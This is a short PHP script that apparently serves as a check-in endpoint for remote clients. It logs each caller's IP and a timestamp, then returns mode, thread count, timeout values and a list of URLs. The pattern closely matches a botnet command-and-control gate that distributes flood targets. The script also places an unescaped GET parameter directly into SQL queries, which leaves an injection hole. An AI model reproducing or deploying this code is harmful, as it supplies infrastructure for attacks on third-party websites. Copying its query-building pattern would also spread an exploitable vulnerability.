<?
	include"core.php";
	include"config.php";
	$ip=$_GET['u'];
	if ($ip=='') {
		include"404.php";
	}
	$ip2=$_SERVER['REMOTE_ADDR'];
	$time=time();
	mysql_query(" INSERT INTO `n` (`ip`,`n`)VALUES('$ip2','$time') ") or die("Error"); 
	mysql_query(" INSERT INTO `td` (`ip2`,`ip`,`time`)VALUES('$ip','$ip2','$time')");
	include"information.php";
	$URL = str_replace('|',"\n",$URL);
if ($Thread==0) {$s=1;}else{$s=0;}
	echo '[]'.$s.'|'.$mode.'|'.$Thread.'|'.$timeout.'|'.$timeoutS.'|'.$URL;
?>